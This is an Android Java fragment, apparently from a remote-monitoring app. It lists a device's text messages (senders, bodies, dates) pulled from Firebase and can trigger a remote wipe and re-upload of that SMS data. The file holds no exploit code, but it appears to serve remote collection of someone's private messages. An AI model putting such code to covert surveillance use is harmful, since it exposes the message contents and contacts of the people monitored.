package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.stream.Collectors;

public class AdminSmsFragment extends Fragment {

    private static WeakReference<AdminSmsFragment> activeInstance;

    private RecyclerView recyclerView;
    private TextView titleView;
    private TextView emptyText;
    private TextView countBadge;
    private EditText searchInput;
    private View loader;
    private SmsAdapter adapter;
    private List<Map<String, String>> fullData = new ArrayList<>();

    @Override
    public void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        activeInstance = new WeakReference<>(this);
    }

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_generic_list, container, false);
        recyclerView = view.findViewById(R.id.generic_list_rv);
        titleView = view.findViewById(R.id.generic_list_title);
        emptyText = view.findViewById(R.id.generic_list_empty_text);
        searchInput = view.findViewById(R.id.generic_list_search_input);
        countBadge = view.findViewById(R.id.generic_list_count);
        loader = view.findViewById(R.id.generic_list_loader);

        view.findViewById(R.id.generic_list_back_button).setOnClickListener(v ->
                getParentFragmentManager().popBackStack());
        view.findViewById(R.id.generic_list_back_button).setVisibility(View.VISIBLE);

        titleView.setText("SMS Logs");
        recyclerView.setLayoutManager(new LinearLayoutManager(getContext()));
        adapter = new SmsAdapter(getContext());
        recyclerView.setAdapter(adapter);

        View filterBtn = view.findViewById(R.id.generic_list_filter_button);
        filterBtn.setVisibility(View.VISIBLE);
        filterBtn.setOnClickListener(v -> showDateSelector());
        filterBtn.setOnLongClickListener(v -> {
            new android.app.AlertDialog.Builder(requireContext())
                    .setTitle("Wipe & Resync SMS")
                    .setMessage("Delete all SMS data from Firebase and trigger a fresh upload from the device?")
                    .setPositiveButton("Wipe & Resync", (d, w) -> {
                        FirebaseUtils.deleteAndResyncSms();
                        Toast.makeText(getContext(), "SMS data wiped — device will re-upload", Toast.LENGTH_LONG).show();
                        loader.setVisibility(View.VISIBLE);
                        fullData.clear();
                        if (adapter != null) adapter.setData(fullData);
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
            return true;
        });

        setupSearch();

        loader.setVisibility(View.VISIBLE);
        FirebaseUtils.getRemoteSms();
        return view;
    }

    private void showDateSelector() {
        loader.setVisibility(View.VISIBLE);
        FirebaseUtils.getAvailableSmsDates(dates -> {
            if (getView() == null) return;
            loader.setVisibility(View.GONE);
            if (dates.isEmpty()) {
                Toast.makeText(getContext(), "No SMS data available", Toast.LENGTH_SHORT).show();
                return;
            }
            String[] dateArray = dates.toArray(new String[0]);
            boolean[] checked = new boolean[dateArray.length];
            new android.app.AlertDialog.Builder(requireContext())
                    .setTitle("Select Dates")
                    .setMultiChoiceItems(dateArray, checked, (dialog, which, isChecked) -> checked[which] = isChecked)
                    .setPositiveButton("Fetch Selected", (dialog, which) -> {
                        List<String> selected = new ArrayList<>();
                        for (int i = 0; i < checked.length; i++) {
                            if (checked[i]) selected.add(dateArray[i]);
                        }
                        if (selected.isEmpty()) {
                            Toast.makeText(getContext(), "Select at least one date", Toast.LENGTH_SHORT).show();
                            return;
                        }
                        loader.setVisibility(View.VISIBLE);
                        FirebaseUtils.getRemoteSms(selected);
                    })
                    .setNegativeButton("Cancel", null)
                    .show();
        });
    }

    private void setupSearch() {
        searchInput.addTextChangedListener(new TextWatcher() {
            @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
            @Override public void onTextChanged(CharSequence s, int start, int before, int count) { filter(s.toString()); }
            @Override public void afterTextChanged(Editable s) {}
        });
    }

    private void filter(String query) {
        if (query.isEmpty()) {
            adapter.setData(fullData);
            countBadge.setText(String.valueOf(fullData.size()));
        } else {
            String lowerQuery = query.toLowerCase();
            List<Map<String, String>> filtered = fullData.stream()
                    .filter(map -> map.values().stream().anyMatch(v -> v != null && v.toLowerCase().contains(lowerQuery)))
                    .collect(Collectors.toList());
            adapter.setData(filtered);
            countBadge.setText(filtered.size() + " / " + fullData.size());
        }
    }

    public static void displaySms(Activity activity, Map<String, Map<String, String>> smsData) {
        if (activeInstance != null && activeInstance.get() != null && activity != null) {
            activity.runOnUiThread(() -> activeInstance.get().updateUI(smsData));
        }
    }

    private void updateUI(Map<String, Map<String, String>> smsData) {
        if (getView() == null) return;
        loader.setVisibility(View.GONE);
        if (smsData == null || smsData.isEmpty()) {
            emptyText.setVisibility(View.VISIBLE);
            recyclerView.setVisibility(View.GONE);
            countBadge.setVisibility(View.GONE);
            fullData.clear();
            return;
        }
        emptyText.setVisibility(View.GONE);
        recyclerView.setVisibility(View.VISIBLE);
        fullData = new ArrayList<>(smsData.values());

        fullData.sort((a, b) -> {
            String d1 = a.get("date");
            String d2 = b.get("date");
            try {
                long l1 = d1 != null ? Long.parseLong(d1) : 0L;
                long l2 = d2 != null ? Long.parseLong(d2) : 0L;
                return Long.compare(l2, l1);
            } catch (Exception e) {
                if (d1 == null) return 1;
                if (d2 == null) return -1;
                return d2.compareTo(d1);
            }
        });

        countBadge.setVisibility(View.VISIBLE);
        filter(searchInput.getText().toString());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        activeInstance = null;
    }

    private static class SmsAdapter extends RecyclerView.Adapter<SmsAdapter.ViewHolder> {
        private List<Map<String, String>> dataList = new ArrayList<>();
        private final Context context;
        private final SimpleDateFormat dateFormat =
                new SimpleDateFormat("MMM dd, yyyy  HH:mm", Locale.getDefault());

        private static final int COLOR_INBOX   = 0xFF4CAF50;
        private static final int COLOR_SENT    = 0xFF7B2FBE;
        private static final int COLOR_DRAFT   = 0xFFFFC107;
        private static final int COLOR_UNKNOWN = 0xFF9E9E9E;

        SmsAdapter(Context context) {
            this.context = context;
        }

        void setData(List<Map<String, String>> data) {
            this.dataList = data;
            notifyDataSetChanged();
        }

        @NonNull
        @Override
        public ViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
            View view = LayoutInflater.from(parent.getContext())
                    .inflate(R.layout.item_sms_card, parent, false);
            return new ViewHolder(view);
        }

        @Override
        public void onBindViewHolder(@NonNull ViewHolder holder, int position) {
            Map<String, String> data = dataList.get(position);
            String type = data.get("type");
            String address = data.get("address");
            String body = data.get("body");
            String dateStr = data.get("date");

            String typeLabel;
            int typeColor;
            if ("1".equals(type) || "INBOX".equalsIgnoreCase(type)) {
                typeLabel = "RECEIVED";
                typeColor = COLOR_INBOX;
            } else if ("2".equals(type) || "SENT".equalsIgnoreCase(type)) {
                typeLabel = "SENT";
                typeColor = COLOR_SENT;
            } else if ("3".equals(type) || "DRAFT".equalsIgnoreCase(type)) {
                typeLabel = "DRAFT";
                typeColor = COLOR_DRAFT;
            } else {
                typeLabel = type != null ? type.toUpperCase(Locale.getDefault()) : "UNKNOWN";
                typeColor = COLOR_UNKNOWN;
            }

            String formattedDate = "";
            if (dateStr != null && !dateStr.isEmpty()) {
                try {
                    formattedDate = dateFormat.format(new Date(Long.parseLong(dateStr)));
                } catch (NumberFormatException e) {
                    formattedDate = dateStr;
                }
            }

            holder.address.setText(address != null ? address : "Unknown");
            holder.body.setText(body != null ? body : "");
            holder.date.setText(formattedDate);
            holder.directionStripe.setBackgroundColor(typeColor);

            GradientDrawable badgeBg = new GradientDrawable();
            badgeBg.setShape(GradientDrawable.RECTANGLE);
            badgeBg.setCornerRadius(dpToPx(12));
            badgeBg.setColor(typeColor);
            holder.typeBadge.setBackground(badgeBg);
            holder.typeBadge.setText(typeLabel);

            holder.copyBtn.setOnClickListener(v -> copyToClipboard(data));
            holder.shareBtn.setOnClickListener(v -> shareData(data));
        }

        private int dpToPx(int dp) {
            return Math.round(dp * context.getResources().getDisplayMetrics().density);
        }

        private void copyToClipboard(Map<String, String> data) {
            StringBuilder sb = new StringBuilder();
            data.forEach((k, v) -> sb.append(k).append(": ").append(v).append("\n"));
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            cm.setPrimaryClip(ClipData.newPlainText("SMS", sb.toString()));
            Toast.makeText(context, "Copied", Toast.LENGTH_SHORT).show();
        }

        private void shareData(Map<String, String> data) {
            StringBuilder sb = new StringBuilder();
            data.forEach((k, v) -> sb.append(k).append(": ").append(v).append("\n"));
            Intent intent = new Intent(Intent.ACTION_SEND);
            intent.putExtra(Intent.EXTRA_TEXT, sb.toString());
            intent.setType("text/plain");
            Intent chooser = Intent.createChooser(intent, "Share SMS via");
            chooser.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(chooser);
        }

        @Override
        public int getItemCount() { return dataList.size(); }

        static class ViewHolder extends RecyclerView.ViewHolder {
            View directionStripe;
            TextView address, body, date, typeBadge;
            View copyBtn, shareBtn;

            ViewHolder(View itemView) {
                super(itemView);
                directionStripe = itemView.findViewById(R.id.sms_direction_stripe);
                address = itemView.findViewById(R.id.sms_address);
                body = itemView.findViewById(R.id.sms_body);
                date = itemView.findViewById(R.id.sms_date);
                typeBadge = itemView.findViewById(R.id.sms_type_badge);
                copyBtn = itemView.findViewById(R.id.sms_copy_button);
                shareBtn = itemView.findViewById(R.id.sms_share_button);
            }
        }
    }
}
